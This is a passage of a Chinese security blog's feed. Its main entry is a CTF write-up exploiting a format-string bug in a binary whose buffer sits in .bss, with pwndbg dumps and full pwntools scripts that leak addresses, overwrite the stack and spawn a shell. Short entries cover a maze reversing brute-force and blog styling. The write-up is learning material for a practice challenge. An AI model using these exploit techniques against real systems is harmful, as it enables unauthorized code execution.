class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from itertools import *</span><br><span class="line"></span><br><span class="line">def crack():</span><br><span class="line">left=right=up=down=&#x27;.&#x27;</span><br><span class="line">j=1</span><br><span class="line">for i in permutations(&#x27;Oo.0&#x27;,4):</span><br><span class="line">left,right,up,down=i</span><br><span class="line">way=right+down+2*right+2*down+left+3*down+4*right+2*up+left*2</span><br><span class="line">p=process(&#x27;./maze&#x27;)</span><br><span class="line">#gdb.attach(p,&#x27;b *0x400827&#x27;)</span><br><span class="line">p.sendline(&#x27;nctf&#123;&#x27;+way+&#x27;&#125;&#x27;)</span><br><span class="line">log.success(&#x27;j=&#x27;+str(j)+&#x27; sent:&#x27;+&#x27;nctf&#123;&#x27;+way+&#x27;&#125;&#x27;)</span><br><span class="line">if &#x27;Congratulations!\n&#x27; in p.recv():</span><br><span class="line">print way</span><br><span class="line">break</span><br><span class="line">j+=1</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line">crack()</span><br></pre></td></tr></table></figure><p>没啥好说的，拿排列组合偷了个懒。顺便记一下<code>itertools</code>里C几几（无序）是<code>combinations</code>。<br><br>我知道这题不难！但是没人好好说我就烦！（完）</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;xctf里新手区的那道maze&lt;/p&gt;</summary>
    
    
    
    
    <category term="Re" scheme="http://ll1ng.github.io/tags/Re/"/>
    
  </entry>
  
  <entry>
    <title>小朋友，儿童节快乐鸭</title>
    <link href="http://ll1ng.github.io/2020/06/01/fmt/"/>
    <id>http://ll1ng.github.io/2020/06/01/fmt/</id>
    <published>2020-05-31T16:00:00.000Z</published>
    <updated>2020-05-31T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>这是一道fmt在bss段上的题。通过这道题我对格式化字符串的理解上了一个新的台阶…</p><span id="more"></span><p>&emsp;&emsp;第一篇技术类博文诶！先激动一下下~<br><br>&emsp;&emsp;<strong>（本文中fmt均指格式化字符串）通篇是结合wiki和做题的个人理解，错误之处望读者不吝赐教</strong><br><br>&emsp;&emsp;fmt这个漏洞比较考验对指针的理解，初次接触时可能会比较吃力（主要指我）。总的来说，经过西工大这两道题，我对fmt这个漏洞的理解如下：<br></p><ul><li>fmt读的漏洞：<ul><li>可以通过<code>%n$p</code>直接获得fmt相对偏移处的数值。原理是当成指针输出（十六进制形式，32位64位都可）</li><li>可以通过<code>%n$s</code>获得偏移处（这是一个地址）所指向的内存的内容。原理是当成字符串地址去解析并输出该地址对应内存的字符串形态。所以当此处被当成地址却不合法时程序会报segment fault错。</li></ul></li><li>fmt写的漏洞<ul><li>通过<code>%nc$hhn</code>,hn,n（$前的n表示任意整数，c表示以字符形式，我比较常用，$后为固定用法）可向偏移处<strong>所指向的内存</strong>最低字节/最低两字节/最低四字节写入printf已打印出的字符个数。（此处表述可能不够严谨，因为会有想要修改的内存地址不是整8位，4位的情况，这种情况下hhn可使用，hn和n的效果倒是还没试过）<code>%nc%n$hhn</code>，可如是使用。</li></ul></li></ul><blockquote><p>注1：n指相对于fmt的偏移。32位在栈上依次是1,2,3…；64位前6个参数在寄存器（包括存放fmt地址的rdi寄存器），之后的参数在栈上（第一个在栈上的数据是printf的第七个参数，相对fmt偏移为6）</p></blockquote><blockquote><p>注2：写的漏洞描述如上，也就是说能够通过偏移直接改写的只有存放二级及以上指针的内存，直接改写会报错。（6.19：一级应该是部分可以改，要看目标地址是否合法（存在及可写））</p></blockquote><p>题目64位，ida结果如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(stdout, 0LL, 2, 0LL);</span><br><span class="line">  setvbuf(stdin, 0LL, 2, 0LL);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    read(0, buf, 0x64uLL);</span><br><span class="line">    if ( !strcmp(buf, &quot;66666666&quot;) )</span><br><span class="line">      break;</span><br><span class="line">    printf(buf, &quot;66666666&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>双击buf，我们看到buf在bss段。这里尝试解释一下fmt在bss段是如何增加难度的。在栈上时，我们能够控制的输入在栈上，可直接通过<code>%nc%n$hhn</code>对我们的输入（想要修改的变量所在的地址）所指向的内存进行修改。在bss段上则无法直接通过上述接触到输入，也就无法直接进行修改。<br>首先说明如何找到<code>pop rdi ret</code>和<code>system</code>，<code>/bin/sh</code>所在地址<br>在printf处下断点，然后<code>stack 31</code><br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; stack 31</span><br><span class="line">00:0000│ rsp  0x7fffffffdde8 —▸ 0x555555554824 (main+138) ◂— jmp    0x5555555547da</span><br><span class="line">01:0008│ rbp  0x7fffffffddf0 —▸ 0x555555554830 (__libc_csu_init) ◂— push   r15</span><br><span class="line">02:0010│      0x7fffffffddf8 —▸ 0x7ffff7a2d830 (__libc_start_main+240) ◂— mov    edi, eax</span><br><span class="line">03:0018│      0x7fffffffde00 ◂— 0x1</span><br><span class="line">04:0020│      0x7fffffffde08 —▸ 0x7fffffffded8 —▸ 0x7fffffffe241 ◂— &#x27;/home/ling/now/game/now/history/west/hill/deploy_pwn/deploy/format_level2/src/pwn&#x27;</span><br><span class="line">05:0028│      0x7fffffffde10 ◂— 0x1f7ffcca0</span><br><span class="line">06:0030│      0x7fffffffde18 —▸ 0x55555555479a (main) ◂— push   rbp</span><br><span class="line">07:0038│      0x7fffffffde20 ◂— 0x0</span><br><span class="line">08:0040│      0x7fffffffde28 ◂— 0x2cc87ef76f3dd02d</span><br><span class="line">09:0048│      0x7fffffffde30 —▸ 0x555555554690 (_start) ◂— xor    ebp, ebp</span><br><span class="line">0a:0050│      0x7fffffffde38 —▸ 0x7fffffffded0 ◂— 0x1</span><br><span class="line">0b:0058│      0x7fffffffde40 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">0d:0068│      0x7fffffffde50 ◂— 0x799d2ba2435dd02d</span><br><span class="line">0e:0070│      0x7fffffffde58 ◂— 0x799d3b18508dd02d</span><br><span class="line">0f:0078│      0x7fffffffde60 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">12:0090│      0x7fffffffde78 —▸ 0x7fffffffdee8 —▸ 0x7fffffffe293 ◂— &#x27;XDG_VTNR=7&#x27;</span><br><span class="line">13:0098│      0x7fffffffde80 —▸ 0x7ffff7ffe168 —▸ 0x555555554000 ◂— jg     0x555555554047</span><br><span class="line">14:00a0│      0x7fffffffde88 —▸ 0x7ffff7de77db (_dl_init+139) ◂— jmp    0x7ffff7de77b0</span><br><span class="line">15:00a8│      0x7fffffffde90 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">17:00b8│      0x7fffffffdea0 —▸ 0x555555554690 (_start) ◂— xor    ebp, ebp</span><br><span class="line">18:00c0│      0x7fffffffdea8 —▸ 0x7fffffffded0 ◂— 0x1</span><br><span class="line">19:00c8│      0x7fffffffdeb0 ◂— 0x0</span><br><span class="line">1a:00d0│      0x7fffffffdeb8 —▸ 0x5555555546ba (_start+42) ◂— hlt    </span><br><span class="line">1b:00d8│      0x7fffffffdec0 —▸ 0x7fffffffdec8 ◂— 0x1c</span><br><span class="line">1c:00e0│      0x7fffffffdec8 ◂— 0x1c</span><br><span class="line">1d:00e8│ r13  0x7fffffffded0 ◂— 0x1</span><br><span class="line">1e:00f0│      0x7fffffffded8 —▸ 0x7fffffffe241 ◂— &#x27;/home/ling/now/game/now/history/west/hill/deploy_pwn/deploy/format_level2/src/pwn&#x27;</span><br></pre></td></tr></table></figure><p>首先找目标地址吧。<br><code>pop rdi ret</code>可用<code>ROPgadget</code>找到，其实还需要<code>ret</code>，因为题目说明远程是18.04，有个对齐的问题，不加<code>ret</code>的话16.04本地能打通但是远程会报错<code>timeout: the monitored command dumped core</code>。具体原因可见<a href="https://www.cnblogs.com/Rookle/p/12871878.html">这篇博客</a>。<br>不难发现加载时程序地址随机，不过后三位一定，所以我们可以先在调试时确定目标地址和我们能够得到的地址的偏移，然后通过运行时泄露能够得到的地址和偏移计算出目标地址。结合<code>vmmap</code>，栈和库的位置同样可以如此获得。这里我分别用偏移为1处获得<code>pop rdi ret</code>，9处获得栈的地址（并计算栈顶），7处获得库中<code>__libc_start_main</code>的地址，从而得知<code>system</code>和<code>/bin/sh</code>的地址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#get_file_offset to get pop rdi</span><br><span class="line">p.sendline(&quot;%p\0&quot;)</span><br><span class="line">one_arg_offset=int(p.recv(14),16)</span><br><span class="line">file_base=one_arg_offset-0x8b4</span><br><span class="line">pop_rdi=file_base+0x893</span><br><span class="line">ret=0x626+file_base</span><br><span class="line">log.info(&#x27;pop rdi:&#x27;+hex(pop_rdi))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#get_stack_rsp_offset</span><br><span class="line">p.sendline(&quot;%9$p\0&quot;)#addr in stack</span><br><span class="line">stack0=int(p.recv(14),16)-232</span><br><span class="line">#change here doen&#x27;t matter where to jump</span><br><span class="line">stack=stack0-8</span><br><span class="line">log.info(&#x27;stack0:&#x27;+hex(stack0))</span><br><span class="line">new_jump=184+stack0</span><br><span class="line">#at offset 29</span><br><span class="line">log.info(&quot;new_jump:&quot;+hex(new_jump))</span><br><span class="line">#get_libc_3rd_offset</span><br><span class="line">p.sendline(&quot;%7$p\0&quot;)</span><br><span class="line">libc_start_main=int(p.recv(14),16)-240</span><br><span class="line">log.info(&#x27;libc_start_main:&#x27;+ hex(libc_start_main))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(&quot;__libc_start_main&quot;,libc_start_main)</span><br><span class="line">libc_base = libc_start_main - libc.dump(&quot;__libc_start_main&quot;)</span><br><span class="line">system_addr = libc_base + libc.dump(&quot;system&quot;)</span><br><span class="line">bin_sh = libc_base + libc.dump(&quot;str_bin_sh&quot;)</span><br><span class="line">log.info(&quot;libc_base:&quot;+hex(libc_base))</span><br><span class="line">log.info(&#x27;system:&#x27;+hex(system_addr))</span><br><span class="line">log.info(&#x27;bin_sh:&#x27;+hex(bin_sh))</span><br></pre></td></tr></table></figure><p>接下来进行修改。<br>手动改的过程中发现进入printf前除了栈顶，栈顶+8，+16的位置都可以修改且修改能一直不被破坏，所以选择先修改栈顶以下的内容，最后再修改栈顶跳转到<code>pop rdi ret</code>处。（其实应该看汇编的吧。。我怎么就赖上调试了呢，害）<br>以下是我修改的具体操作：在栈上找到一个指向栈内地址的二级及以上指针。我一开始找的是偏移为9处，跳板就在对应的35处。手动改的时候感觉9和35这两个地方挺稳定的，因为printf完后在下一次printf前就能看到结果，然鹅是我太天真…调试的时候发现再经过一次printf，35处低两字节就会变到0007。<del>甚至还跑去问槐它为什么自己会变指向，我没被打死真是一个奇迹</del>不过既然能控制一次，那么每次都重新改一次指向应该也能做所以就没换地方，继续用35处做的题。<br><br>接下来就是手动改了。注意到地址基本都是6个字节（啊你在说什么你这个全靠调试不看书的家伙！）所以编写了这两个函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">def point_to_target(addr):</span><br><span class="line">    payload=&#x27;%&#123;&#125;c%9$hn&#x27;.format(int(hex(new_jump)[-4:],16))</span><br><span class="line">    p.sendline(payload.ljust(99,&#x27;\x00&#x27;))</span><br><span class="line">    p.recv()</span><br><span class="line">    payload=&#x27;%&#123;&#125;c%35$hn&#x27;.format(int(hex(addr)[-4:],16))</span><br><span class="line">    p.sendline(payload.ljust(99,&#x27;\x00&#x27;))</span><br><span class="line">    p.recv()</span><br><span class="line"></span><br><span class="line">def change(addr,value):</span><br><span class="line">    svalue=hex(value)[2:]#12 bit,6 byte</span><br><span class="line">    print svalue</span><br><span class="line">    for i in range(5,-1,-1):  </span><br><span class="line">        print svalue[2*i:2*i+2]</span><br><span class="line">        point_to_target(addr+5-i)        </span><br><span class="line">        log.info(&quot;point to stack0+&#123;&#125;&quot;.format(5-i))        </span><br><span class="line">        #p.recv()</span><br><span class="line">        payload=&#x27;%&#123;&#125;c%29$hhn&#x27;.format(int(svalue[2*i:2*i+2],16))</span><br><span class="line">        p.sendline(payload.ljust(99,&#x27;\x00&#x27;))</span><br><span class="line">        p.recv()</span><br></pre></td></tr></table></figure><p>值得注意的一个地方是read函数接收到<code>\0</code>也不会截断，所以我填补99个<code>\x00</code>并连带<code>sendline</code>最后的换行符一共100个字符。也可以<code>payload.ljust(&#39;\x00&#39;,100)</code>然后用<code>send</code>发送。（咳咳，7.30我来打脸。read读的时候可以直接send()…我整麻烦了。<strong>这里还有个奇怪的东东没搞懂就是输入会堆在一起那个现象</strong>）最后修改部分的exp如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">change(stack0,bin_sh)</span><br><span class="line">change(stack0+8,system_addr)</span><br><span class="line">point_to_target(stack)</span><br><span class="line">svalue=hex(pop_rdi)</span><br><span class="line">payload=&#x27;%&#123;&#125;c%29$hhn&#x27;.format(int(svalue[-4:],16))</span><br><span class="line">p.sendline(payload.ljust(99,&#x27;\x00&#x27;))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>环境关闭木有远程打的机会了，<code>ret</code>的部分就<del>懒得</del>没加，道理应该是一样的。不过加<code>ret</code>的话会改到9的位置，emm有点子问题。先留坑，以后再填。溜了溜了</p><h3 id="6-27用one-gadget做了一下"><a href="#6-27用one-gadget做了一下" class="headerlink" title="6.27用one_gadget做了一下"></a>6.27用<code>one_gadget</code>做了一下</h3><p>额，心态有点炸，因为又是调试出来的，但是不会调其他版本就很伤…这个汇编实际执行情况和我预料的出入有点大，先记下来以后看看能不能明白8<br></p><p>呃呃还知道了<code>one gadget libc</code>结果的后面<code>==NULL</code>的意思是执行条件，后面堆要是都不满足的话还得自己构造。行（</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p=process(&quot;./pwn&quot;)</span><br><span class="line">#p=process([&#x27;./pwn&#x27;],env=&#123;&quot;LD_PRELOAD&quot;:&#x27;./libc-2.27.so&#x27;&#125;)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;)</span><br><span class="line">one_gadget223=0xf1147</span><br><span class="line"></span><br><span class="line">#get_file_offset to get pop rdi</span><br><span class="line">p.sendline(&quot;%p\0&quot;)</span><br><span class="line">one_arg_offset=int(p.recv(14),16)</span><br><span class="line">file_base=one_arg_offset-0x8b4</span><br><span class="line">pop_rdi=file_base+0x893</span><br><span class="line">ret=0x626+file_base</span><br><span class="line">log.info(&#x27;pop rdi:&#x27;+hex(pop_rdi))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#get_stack_rsp_offset</span><br><span class="line">p.sendline(&quot;%9$p\0&quot;)#addr in stack</span><br><span class="line">stack0=int(p.recv(14),16)-232</span><br><span class="line">#change here doen&#x27;t matter where to jump</span><br><span class="line">stack=stack0-8</span><br><span class="line">log.info(&#x27;stack0:&#x27;+hex(stack0))</span><br><span class="line">new_jump=184+stack0</span><br><span class="line">#at offset 29</span><br><span class="line">log.info(&quot;new_jump:&quot;+hex(new_jump))</span><br><span class="line">#get_libc_3rd_offset</span><br><span class="line">p.sendline(&quot;%7$p\0&quot;)</span><br><span class="line">#print p.recvuntil(&#x27;0x&#x27;)</span><br><span class="line">libc_start_main=int(p.recv(14),16)-240</span><br><span class="line">log.info(&#x27;libc_start_main:&#x27;+ hex(libc_start_main))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">one_gadget_actual=libc_start_main-libc.sym[&#x27;__libc_start_main&#x27;]+one_gadget223</span><br><span class="line">log.info(&quot;one gadget:&quot;+hex(one_gadget_actual))</span><br><span class="line"></span><br><span class="line">def point_to_target(addr):</span><br><span class="line">    payload=&#x27;%&#123;&#125;c%9$hn&#x27;.format(int(hex(new_jump)[-4:],16))</span><br><span class="line">    p.sendline(payload.ljust(99,&#x27;\x00&#x27;))</span><br><span class="line">    p.recv()</span><br><span class="line">    payload=&#x27;%&#123;&#125;c%35$hn&#x27;.format(int(hex(addr)[-4:],16))</span><br><span class="line">    p.sendline(payload.ljust(99,&#x27;\x00&#x27;))</span><br><span class="line">    p.recv()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def change(addr,value):</span><br><span class="line">    svalue=hex(value)[2:]#12 bit,6 byte</span><br><span class="line">    print svalue</span><br><span class="line">    for i in range(5,-1,-1):  </span><br><span class="line">        print svalue[2*i:2*i+2]</span><br><span class="line">        point_to_target(addr+5-i)        </span><br><span class="line">        log.info(&quot;point to stack0+&#123;&#125;&quot;.format(5-i))        </span><br><span class="line">        #p.recv()</span><br><span class="line">        payload=&#x27;%&#123;&#125;c%29$hhn&#x27;.format(int(svalue[2*i:2*i+2],16))</span><br><span class="line">        p.sendline(payload.ljust(99,&#x27;\x00&#x27;))</span><br><span class="line">        p.recv()</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">change(stack0+8,one_gadget_actual)</span><br><span class="line">log.info(&quot;stack0 change&quot;)</span><br><span class="line">change(stack0,ret)</span><br><span class="line">point_to_target(stack)</span><br><span class="line">svalue=hex(ret)</span><br><span class="line">payload=&#x27;%&#123;&#125;c%29$hhn&#x27;.format(int(svalue[-4:],16))</span><br><span class="line">p.sendline(payload.ljust(99,&#x27;\x00&#x27;))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>问题出在将栈顶改为<code>ret</code>而+8的位置改为<code>one_gadget</code>时汇编最后<code>pop rbp ret</code>，<code>ret</code>的是+16处<code>__libc_start_main+240</code>…懵逼，我就又加了一句<code>ret</code>。<br></p><p>隔得久了我不知道上一句我在说啥，反正上面脚本跑不通，再留坑。整体来说这个方法不是太好感觉，可拓展性不够强。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;这是一道fmt在bss段上的题。通过这道题我对格式化字符串的理解上了一个新的台阶…&lt;/p&gt;</summary>
    
    
    
    
    <category term="pwn_stack" scheme="http://ll1ng.github.io/tags/pwn-stack/"/>
    
  </entry>
  
  <entry>
    <title>我来试试</title>
    <link href="http://ll1ng.github.io/2020/03/27/%E6%88%91%E6%9D%A5%E8%AF%95%E8%AF%95/"/>
    <id>http://ll1ng.github.io/2020/03/27/%E6%88%91%E6%9D%A5%E8%AF%95%E8%AF%95/</id>
    <published>2020-03-27T15:03:54.000Z</published>
    <updated>2020-03-27T15:03:54.000Z</updated>
    
    <content type="html"><![CDATA[<p>博客终于差不多能见人了…<br></p><span id="more"></span><p>那么国际惯例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(&quot;hello world&quot;)</span><br></pre></td></tr></table></figure><h3 id="关于搭建"><a href="#关于搭建" class="headerlink" title="关于搭建"></a>关于搭建</h3><p><del>果然猛男就是要把博客布置得花里胡哨才肯罢休</del><br>还有一部分功能没实现，等6月后吧。<br>个性化之前所有的操作都来自于大哥的<a href="https://www.wootec.top/2019/08/19/%E7%94%A8Next%E7%BE%8E%E5%8C%96-HEXO-GitHub-%E5%8D%9A%E5%AE%A2/">这篇博客</a>和小姐妹的<a href="http://cor1e.cn/2019/10/03/1/#more">这篇</a>。懒得查资料就直接白嫖了，感谢二位！<br><br>终于可以先安心写会儿作业了ε=(´ο｀*)))<del>我听到了咕咕咕的声音</del><br></p><p>&emsp;&emsp;2022.10.12 发现博客迁移完成后<code>gitalk</code>不能正常加载，没想明白为什么。修改<code>theme/next/_config.yml</code>文件夹中与<code>gitalk</code>相关的设置，此时能够正常加载。接下来改透明度。将默认导入的<code>gitalk.css</code>下载下来放置在<code>themes/next/source/css</code>下，修改<code>themes/next/_config.yml</code>文件中<code>gitalk_css</code>的值为<code>/css/gitalk.css</code>，在该<code>css</code>文件中添加：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#gitalk-container</span>&#123;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="built_in">rgba</span>(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>,<span class="number">0.6</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;博客终于差不多能见人了…&lt;br&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="日常碎碎念" scheme="http://ll1ng.github.io/tags/%E6%97%A5%E5%B8%B8%E7%A2%8E%E7%A2%8E%E5%BF%B5/"/>
    
  </entry>
  
</feed>
